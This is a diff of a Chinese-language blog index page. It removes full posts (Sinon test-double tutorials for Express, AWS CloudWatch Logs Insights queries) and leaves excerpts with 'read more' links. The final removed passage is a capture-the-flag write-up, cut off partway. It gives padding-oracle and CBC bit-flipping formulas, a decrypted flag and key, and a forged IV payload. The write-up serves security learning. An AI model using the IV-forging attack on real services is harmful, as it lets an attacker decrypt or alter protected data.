-<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sinon = <span class="built_in">require</span>(<span class="string">"sinon"</span>);</span><br><span class="line"><span class="keyword">const</span> spy = sinon.spy();</span><br><span class="line">spy()</span><br><span class="line"><span class="built_in">console</span>.log(spy.callCount);</span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure></p>
-<p>基本上所有測試替身呼叫後，都是會回傳一個可執行 function 回來<br>
-根據前面介紹過，spy 是單純拿來做紀錄以及驗證<br>
-上面的範例來說，就可以知道這個 function 被呼叫一次<br>
-另外在 spy 的狀況下，function 實際行為是會被觸發，我們再來看另一段 code<br>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sinon = <span class="built_in">require</span>(<span class="string">"sinon"</span>);</span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    test: <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"this is test: "</span> + a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> spy = sinon.spy(obj, <span class="string">"test"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(spy(<span class="string">"hihi"</span>));</span><br><span class="line"><span class="comment">// this is test: hihi</span></span><br><span class="line"><span class="built_in">console</span>.log(obj.test(<span class="string">"hihi2"</span>));</span><br><span class="line"><span class="comment">// this is test: hihi2</span></span><br><span class="line"><span class="built_in">console</span>.log(spy.callCount);</span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
-以上面的例子可以看到，程式實際上的邏輯是有被觸發成功的<br>
-透過 spy 回傳的值，也是一個可執行的 function<br>
-透過 <code>spy()</code> 或是 <code>obj.test()</code> 去觸發，都會被記錄起來</p>
-<h4><span id="如何在-express-上使用-spy">如何在 express 上使用  spy</span></h4>
-<p>程式碼會增加一段對 username 進行 hash 再去做 login<br>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// authControler.js</span></span><br><span class="line"><span class="keyword">const</span> run = <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;</span><br><span class="line">        username</span><br><span class="line">    &#125; = &#123;...req.body&#125;;</span><br><span class="line">    <span class="keyword">const</span> result = <span class="keyword">await</span> apiService.login(hash.sha256(username))</span><br><span class="line">    <span class="keyword">if</span> (result.status !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.json(&#123;</span><br><span class="line">            message: <span class="string">"登入失敗"</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;</span><br><span class="line">        message: <span class="string">"登入成功"</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hash.js</span></span><br><span class="line"><span class="keyword">const</span> sha256 = <span class="function">(<span class="params">username</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> t = ctypto.createHash(<span class="string">"sha256"</span>);</span><br><span class="line">    <span class="keyword">return</span> t.update(username, <span class="string">"utf8"</span>).digest(<span class="string">"base64"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>先來跑跑看 unit test 會發現結果是錯的<br>
-原因是因為原本設定好 login 的時候，參數應該會是帶 <code>&quot;123&quot;</code><br>
-但因為變成 hash 之後會改成 <code>&quot;pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM=&quot;</code><br>
-把 unit test 裡面的 withArgs 改成 <code>apiServiceLogin.withArgs(&quot;pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM=&quot;)</code> 即可</p>
-<p>此時我們想要針對 <code>hash.sha256</code> 進行次數監控<br>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hashSha256 = sinon.spy(hash, <span class="string">"sha256"</span>);</span><br><span class="line">beforeEach(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        apiServiceLogin.reset()</span><br><span class="line">        hashSha256.resetHistory()</span><br><span class="line">    &#125;)</span><br><span class="line">    it(<span class="string">"登入成功, hash 一次"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> req = mockRequest(&#123;</span><br><span class="line">            username: <span class="string">"123"</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">const</span> res = mockResponse();</span><br><span class="line">        apiServiceLogin.withArgs(<span class="string">"pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM="</span>).resolves(&#123;</span><br><span class="line">            status: <span class="number">0</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> authController.run(req, res)</span><br><span class="line">        sinon.assert.calledWith(res.json, &#123;</span><br><span class="line">            message: <span class="string">"登入成功"</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        sinon.assert.calledOnce(res.json);</span><br><span class="line">        sinon.assert.calledOnce(hashSha256)</span><br><span class="line">    &#125;)</span><br><span class="line">    it(<span class="string">"登入錯誤, hash 一次"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> req = mockRequest(&#123;</span><br><span class="line">            username: <span class="string">"123"</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">const</span> res = mockResponse();</span><br><span class="line">        apiServiceLogin.withArgs(<span class="string">"pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM="</span>).resolves(&#123;</span><br><span class="line">            status: <span class="number">999</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> authController.run(req, res)</span><br><span class="line">        sinon.assert.calledWith(res.json, &#123;</span><br><span class="line">            message: <span class="string">"登入失敗"</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        sinon.assert.calledOnce(res.json);</span><br><span class="line">        sinon.assert.calledOnce(hashSha256)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></p>
-<p>先在最前面加上 <code>const hashSha256 = sinon.spy(hash, &quot;sha256&quot;);</code> 取完成 spy 的動作
-然後在最後面加上了驗證 <code>sinon.assert.calledOnce(hashSha256)</code> 就可以完成驗證動作<br>
-除此之外，要先在 <code>beforeEach</code> 加上 <code>hashSha256.resetHistory()</code> 去重置計算次數</p>
-<h3><span id="express-with-sinon-mock">Express with Sinon Mock</span></h3>
-<h4><span id="sinon-mock">Sinon Mock</span></h4>
-<p>不同於 stub 以及 spy<br>
-透過 mock 回傳的東西並不是一個可執行的 function<br>
-而是要透過此 mock 去進行設定，類似『驗證』用的東西<br>
-以及可以像是 stub 一樣，指定在 function 被呼叫的時候，應該會有什麼樣的回傳值<br>
-但又不同於 stub 以及 spy，mock 並不能直接去針對某一個做 mock<br>
-而是只能會對整個 obj 做 mock<br>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sinon = <span class="built_in">require</span>(<span class="string">"sinon"</span>);</span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    test: <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"this is test: "</span> + a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> mock = sinon.mock(obj);</span><br><span class="line"><span class="comment">// 驗證只能最多被呼叫 2 次</span></span><br><span class="line">mock.expects(<span class="string">"test"</span>).atLeast(<span class="number">2</span>).returns(&#123;<span class="attr">status</span>: <span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(obj.test());</span><br><span class="line"><span class="comment">// &#123; status: 1 &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(obj.test());</span><br><span class="line"><span class="comment">// &#123; status: 1 &#125;</span></span><br><span class="line"></span><br><span class="line">mock.verify()</span><br></pre></td></tr></table></figure></p>
-<p>透過 <code>mock.expects(&quot;test&quot;).atLeast(2).returns({status: 1})</code> 去設定<br>
-預期哪一個 method 應該回傳什麼樣的值以及設定可被執行的次數<br>
-最後再透過 <code>mock.verify()</code> 可以啟用這個 assertion<br>
-除此之外，如果想要回復這個被 mock 原始的 method 的話<br>
-可以透過 <code>mock.restore()</code> 去做回覆的動作<br>
-這樣回覆之後，就會執行原本 function 的邏輯了</p>
-<h4><span id="如何在-express-上使用-mock">如何在 express 上使用 mock</span></h4>
-<p>基本上程式碼跟上一個很像，但不一樣的地方在於<br>
-我想要針對 apiService.js 去進行驗證，以及模擬回傳值<br>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> apiServiceLogin = sinon.mock(apiService);</span><br><span class="line">it(<span class="string">"登入成功, hash 一次"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> req = mockRequest(&#123;</span><br><span class="line">            username: <span class="string">"123"</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">const</span> res = mockResponse();</span><br><span class="line">        apiServiceLogin.expects(<span class="string">"login"</span>).withArgs(<span class="string">"pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM="</span>).resolves(&#123;</span><br><span class="line">            status: <span class="number">0</span></span><br><span class="line">        &#125;).once();</span><br><span class="line">        <span class="keyword">await</span> authController.run(req, res)</span><br><span class="line">        sinon.assert.calledWith(res.json, &#123;</span><br><span class="line">            message: <span class="string">"登入成功"</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        sinon.assert.calledOnce(res.json);</span><br><span class="line">        sinon.assert.calledOnce(hashSha256)</span><br><span class="line">    &#125;)</span><br><span class="line">    it(<span class="string">"登入錯誤, hash 一次"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> req = mockRequest(&#123;</span><br><span class="line">            username: <span class="string">"123"</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">const</span> res = mockResponse();</span><br><span class="line">        apiServiceLogin.expects(<span class="string">"login"</span>).withArgs(<span class="string">"pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM="</span>).resolves(&#123;</span><br><span class="line">            status: <span class="number">-1</span></span><br><span class="line">        &#125;).once();</span><br><span class="line">        <span class="keyword">await</span> authController.run(req, res)</span><br><span class="line">        sinon.assert.calledWith(res.json, &#123;</span><br><span class="line">            message: <span class="string">"登入失敗"</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        sinon.assert.calledOnce(res.json);</span><br><span class="line">        sinon.assert.calledOnce(hashSha256)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></p>
-<p>差別在於以下程式，透過 mock，可以去指定回傳值，以及可以兼顧驗證用的功能
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apiServiceLogin.expects(<span class="string">"login"</span>).withArgs(<span class="string">"pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM="</span>).resolves(&#123;</span><br><span class="line">    status: <span class="number">-1</span></span><br><span class="line">&#125;).once();</span><br></pre></td></tr></table></figure></p>
-<h3><span id="express-with-sinon-fake">Express with Sinon Fake</span></h3>
-<h4><span id="sinon-fake">Sinon Fake</span></h4>
-<p>在 Sinon 官網上對於 Fake 的說明是<br>
-一種把 spy 跟 stub 混合的一種形式<br>
-所以這邊後面並不會介紹如何在 express 上面實作<br>
-而是會針對這個 fake 功能做些簡單的範例而已</p>
-<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sinon = <span class="built_in">require</span>(<span class="string">"sinon"</span>);</span><br><span class="line"><span class="keyword">const</span> fake = sinon.fake.returns(&#123;<span class="attr">status</span>: <span class="number">1</span>&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(fake());</span><br><span class="line">&#123; <span class="attr">status</span>: <span class="number">1</span> &#125;</span><br></pre></td></tr></table></figure></p>
-<p>跟 stub 一樣可以指定該 function 應該回傳的值<br>
-但他也有可以取代原本 method 的功能，程式如下</p>
-<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sinon = <span class="built_in">require</span>(<span class="string">"sinon"</span>);</span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    test: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"test"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> fake = sinon.fake.returns(&#123;<span class="attr">status</span>: <span class="number">1</span>&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(obj.test());</span><br><span class="line"><span class="comment">// test</span></span><br><span class="line">sinon.replace(obj, <span class="string">"test"</span>, fake)</span><br><span class="line"><span class="built_in">console</span>.log(obj.test());</span><br><span class="line"><span class="comment">// &#123; status: 1 &#125;</span></span><br></pre></td></tr></table></figure></p>
-<p>透過 <code>sinon.replace</code>，可以取代掉原本 function 的實際邏輯</p>
-<h2><span id="結語">結語</span></h2>
-<p>以上介紹完每一個 test double 的意思以及使用場景<br>
-但使用場景上，我也還在思考什麼樣的場景可以搭配什麼去使用<br>
-歡迎各位一起在下面留言進行討論<br>
-未來會再針對實務上 unit test 遇到的困難再回來整理一篇</p>
-<h2><span id="references">References</span></h2>
-<ol>
-<li>https://www.sitepoint.com/sinon-tutorial-javascript-testing-mocks-spies-stubs/</li>
-<li>https://dev.to/milipski/test-doubles---fakes-mocks-and-stubs</li>
-<li>https://codewithhugo.com/express-request-response-mocking/</li>
-<li>https://tpu.thinkpower.com.tw/tpu/articleDetails/1294</li>
-<li>http://kaczanowscy.pl/tomek/2011-01/testing-basics-sut-and-docs</li>
-</ol>
-
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><span style="color:green">[2019-12-22 Update]</span><br>在<a href="https://yu-jack.github.io/2019/12/22/unit-test-express-implement-troubleshooting/">express unit test 一些技巧教學以及困難點</a>裡面有針對一些技巧做說明<br>以及增加測試涵蓋率的使用方式</p>
+<p>在很久很久之前有提到過 <a href="https://yu-jack.github.io/2017/11/01/how-to-test/">unit test</a><br>但那時候只有針對簡單到不能在簡單的 function 進行 unit test<br>想必大家一定也不太了解 unit test 究竟要怎麼用在真正開發上面  </p>
         </div>
         
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2019/12/10/unit-test-express/#more">繼續閱讀</a>
+                </div>
+            </div>
+        </div>
         
         
     </div>
@@ -810,80 +424,17 @@ from <a href="https://sinonjs.org/releases/latest/fakes/">Sinon Fake</a></p>
             
         </h1>
         <div class="content">
-            <h2><span id="前言">前言</span></h2>
-<p>AWS CloudWatch 是一個可以監控日誌用以及伺服器狀態等等的服務<br>
-其他還有像是 Alarm Events 都是從以下兩個大項目延伸出去的額外功能<br>
-這邊就先不多作介紹，之後會寫在其他篇幅做介紹<br>
-那 CloudWatch 主要包含以下兩個大項目</p>
-<p>&lt;!-- more --&gt;</p>
-<ol>
-<li>Metric
-紀錄了 AWS 上面服務的狀態
-包含 EC2 的 CPU、網路使用量、記憶體用量和硬碟大小
-API Gateway API Call Count、RDS CPU 用量等等
-針對用量還可以去做 Alarm 發信，或是觸發 Lambda 等等的功能
-<blockquote>
-<p>記憶體和硬碟大小需要額外設定
-可以參考 https://docs.aws.amazon.com/zh_tw/AWSEC2/latest/UserGuide/mon-scripts.html</p>
-</blockquote>
-</li>
-<li>Log
-存放 Log 的地方，伺服器的 access log 或是程式的 log
-又或是 audit log 等等，基本上想看的 log 可以推上來做分析以及整理
-除此之外，s3 其實也是一個放 log 的好地方
-但 s3 的缺點是不能夠很便利的去線上觀看 log</li>
-</ol>
-<p>今天主要介紹的是 CloudWatch Logs Insights 功能
-透過 Insights 可以有效地查詢 Log 裡面的資料
-甚至還可以做統計以及剖析 Log 裡面的字串進行字串統計</p>
-<h2><span id="使用方式">使用方式</span></h2>
-<h3><span id="範例一-like">範例一 - like</span></h3>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fields @timestamp, @message</span><br><span class="line">| sort @timestamp desc</span><br><span class="line">| filter @message like &quot;Your Wanted Message&quot;</span><br></pre></td></tr></table></figure>
-第一行 fileds 主要指定最後出現的欄位會有什麼<br>
-第二行 sort 是根據 timestamp 進行由大至小的排序<br>
-第三行 filter 是針對 @message 的內容去搜尋</p>
-<p>最後只會顯示跟 like 後面有關的字串的結果而已</p>
-<p>這邊要另外注意的事情是，每一個指令都是有&lt;span style=&quot;color: red&quot;&gt;順序性&lt;/span&gt;的<br>
-以上面第三行的結果來說<br>
-假設第四行再下了一個 <code>filter @message like &quot;blablabla</code><br>
-一個跟前面完全沒有關係的訊息是找不到的<br>
-因為在第三行就把所有訊息都過慮剩下只有 &quot;Your Wanted Message&quot;<br>
-所以在第四行針對 &quot;Your Wanted Message&quot; 去搜尋 &quot;blablabla&quot; 當然就不會出現任何結果</p>
-<h3><span id="範例二-logstream">範例二 - @logStream</span></h3>
-<p>在整個操作 UI 上<br>
-最上面會有一個可以選 logGroup 的地方<br>
-但卻沒有選 logStream 的地方</p>
-<p><img src="/images/aws/aws-cloudwatch-logs-insights-01.png" alt></p>
-<p>此時會需要透過 filter 加上 @logStream 的方式才能找單獨的 stream<br>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fields @timestamp, @message</span><br><span class="line">| filter @logStream &#x3D; &quot;Access Logs&quot;</span><br></pre></td></tr></table></figure></p>
-<h3><span id="範例三-parse">範例三 - parse</span></h3>
-<p>假設今天要處理 access log 的 path 做統計的話<br>
-字串有一段內容是 &quot;GET /login HTTP/1.1&quot;<br>
-我想要 parse 出 /login 的話該怎麼做呢？<br>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fields @timestamp, @message</span><br><span class="line">| sort @timestamp desc</span><br><span class="line">| parse &#39;&quot;GET * HTTP&#x2F;1.1&#39; as @path</span><br></pre></td></tr></table></figure>
-第三行 透過 parse 指令加上 * 可以把 * 的地方變成一個變數指定到 as 後面的變數去<br>
-這裡變數要不要加 @ 都可以，結果如下：<br>
-<img src="/images/aws/aws-cloudwatch-logs-insights-02.png" alt></p>
-<p>那如果想要 parse 兩個變成變數呢?<br>
-很簡單，就是再多加一個 * 字號在後面即可<br>
-<code>| parse '&quot;GET * */1.1' as @path, @protocol</code><br>
-<img src="/images/aws/aws-cloudwatch-logs-insights-03.png" alt></p>
-<h3><span id="範例四-stats-count">範例四 - stats count()</span></h3>
-<p>以前面的例子來說<br>
-我想知道在短時間內有幾個 login 的話<br>
-可以透過 stats 的指令去做統計<br>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fields @timestamp, @message</span><br><span class="line">| filter @logStream &#x3D; &quot;Access Logs&quot;</span><br><span class="line">| sort @timestamp desc</span><br><span class="line">| parse &#39;&quot;GET * *&#x2F;1.1&#39; as @path, @protocol</span><br><span class="line">| stats count(*) as sum by @path</span><br></pre></td></tr></table></figure>
-第五行 透過 by 指令去 group by 用哪一個參數當作目標去做計算<br>
-<img src="/images/aws/aws-cloudwatch-logs-insights-04.png" alt></p>
-<p>當然一樣可以多個 <code>| stats count(*) as sum by @path, @protocol</code><br>
-<img src="/images/aws/aws-cloudwatch-logs-insights-05.png" alt></p>
-<h2><span id="後記">後記</span></h2>
-<p>以上介紹一些個人比較常用的指令，官網還有很多非常好用的指令<br>
-詳細有興趣可以到官網上查查看<br>
-https://docs.aws.amazon.com/zh_tw/AmazonCloudWatch/latest/logs/CWL_QuerySyntax.html</p>
-
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>AWS CloudWatch 是一個可以監控日誌用以及伺服器狀態等等的服務<br>其他還有像是 Alarm Events 都是從以下兩個大項目延伸出去的額外功能<br>這邊就先不多作介紹，之後會寫在其他篇幅做介紹<br>那 CloudWatch 主要包含以下兩個大項目  </p>
         </div>
         
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2019/11/28/aws-cloudwatch-logs-insights/#more">繼續閱讀</a>
+                </div>
+            </div>
+        </div>
         
         
     </div>
@@ -927,95 +478,17 @@ https://docs.aws.amazon.com/zh_tw/AmazonCloudWatch/latest/logs/CWL_QuerySyntax.h
             
         </h1>
         <div class="content">
-            <h1><span id="encrypted-pastebin">Encrypted Pastebin</span></h1>
-<p>這題總共有四個 flag</p>
-<p>&lt;!-- more --&gt;</p>
-<h2><span id="0x00">0x00</span></h2>
-<p>一開始畫面長這樣<br>
-<img src="/images/ctf/part6-aes-1-01.png" alt></p>
-<p>試著輸入值之後，發現上面有一段 <code>?post=</code> 資料<br>
-<img src="/images/ctf/part6-aes-1-02.png" alt></p>
-<p>嘗試更改之後，發現 flag<br>
-<img src="/images/ctf/part6-aes-1-03.png" alt></p>
-<h2><span id="0x01">0x01</span></h2>
-<p>根據上一個 error message 得知有用到 base64<br>
-所以可以知道 <code>?post=</code> 的是 base64<br>
-接下來再輸入一些奇怪的值試試看<br>
-<img src="/images/ctf/part6-aes-2-01.png" alt></p>
-<p>發現程式使用的是 aes-128-cbc 去把資料作加密<br>
-且根據錯誤訊息表示 IV 要為 16 bytes，代表 post 是需要帶入 IV 進去的<br>
-那根據<a href="https://skysec.top/2017/12/13/padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/">這篇</a>解釋 aes 加解密以及存在的 padding oracle 攻擊<br>
-得知透過修改 iv 可以對解密後的資料做 XOR，進而達到目標 payload<br>
-主要公式如下:<br>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; new_iv 為攻擊者構造的 iv</span><br><span class="line">&#x2F;&#x2F; iv 為原本的 iv</span><br><span class="line">&#x2F;&#x2F; plain 為明文</span><br><span class="line">&#x2F;&#x2F; middle 代表透過 aes 解密後，但還未經過 xor 的時候的 payload</span><br><span class="line">公式 1: plain[i] &#x3D; middle[i] XOR iv[i]</span><br><span class="line">公式 2: 0x01 &#x3D; middle[i] XOR new_iv[i]</span><br><span class="line">公式 3: middle[i] &#x3D; 0x01 XOR new_iv[i]</span><br><span class="line">公式 4: plain[i]&#x3D; 0x01 XOR new_iv[i] XOR iv[i]</span><br></pre></td></tr></table></figure>
-透過以上公式可以推斷出明文，這邊用 16bytes 去排版，方便後續說明
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;flag&quot;: &quot;^FLAG^</span><br><span class="line">a38f2d9e2659df72</span><br><span class="line">12c341bc01a2cf82</span><br><span class="line">8c7d663978eb476a</span><br><span class="line">c6d664a03f49c08c</span><br><span class="line">$FLAG$&quot;, &quot;id&quot;: &quot;</span><br><span class="line">3&quot;, &quot;key&quot;: &quot;rTU2</span><br><span class="line">s8qRJ4uRRdLFJbt-</span><br><span class="line">YA~~&quot;&#125;\n\n\n\n\n\n\n\n\n\n</span><br></pre></td></tr></table></figure></p>
-<h2><span id="0x02">0x02</span></h2>
-<p>因為上一題有發現 id 為 3<br>
-於是開始繼續利用上一個 flag 提到的文章裡面的翻轉攻擊去修改解密後的明文<br>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; new_iv 為攻擊者構造的 iv</span><br><span class="line">&#x2F;&#x2F; iv 為原本的 iv</span><br><span class="line">&#x2F;&#x2F; plain 為明文</span><br><span class="line">&#x2F;&#x2F; middle 代表透過 aes 解密後，但還未經過 xor 的時候的 payload</span><br><span class="line">&#x2F;&#x2F; &#39;x&#39; 為我們想要把解密後的值透過 xor 後變成的結果</span><br><span class="line">公式 1: plain[i] &#x3D; middle[i] XOR iv[i]</span><br><span class="line">公式 2: &#39;x&#39; &#x3D; middle[i] XOR new_iv[i]</span><br><span class="line">公式 3: &#39;x&#39; XOR new_iv[i] XOR iv[i] &#x3D; plain[i]</span><br><span class="line">公式 4: new_iv[i] &#x3D; plain[i] XOR &#39;x&#39; XOR iv[i]</span><br></pre></td></tr></table></figure></p>
-<p>透過上面公式可以去修改原本的 payload<br>
-這裡我們先只拿第一段來做修改，先省略掉其他 payload<br>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">原本 iv: 05694ed4efacf438e310a4fc54ff2826</span><br><span class="line">原本明文: &#123;&quot;flag&quot;: &quot;^FLAG^</span><br><span class="line">預期明文: &#123;&quot;id&quot;: &quot;1&quot;&#125;\x05\x05\x05\x05\x05 (記得不夠是要 padding value)</span><br><span class="line"></span><br><span class="line">原本的值: 05694ed4efacf438e310a4fc54ff28265a813ad8376339531ea70324a0ce85c8</span><br><span class="line">更改後的: 056941dcacf1f620f21087bf1dbb6a7d5a813ad8376339531ea70324a0ce85c8</span><br></pre></td></tr></table></figure>
-上面可以發現前面 32 bytes 的 iv 已經變了<br>
-把這個 payload 塞回去得到下面得結果<br>
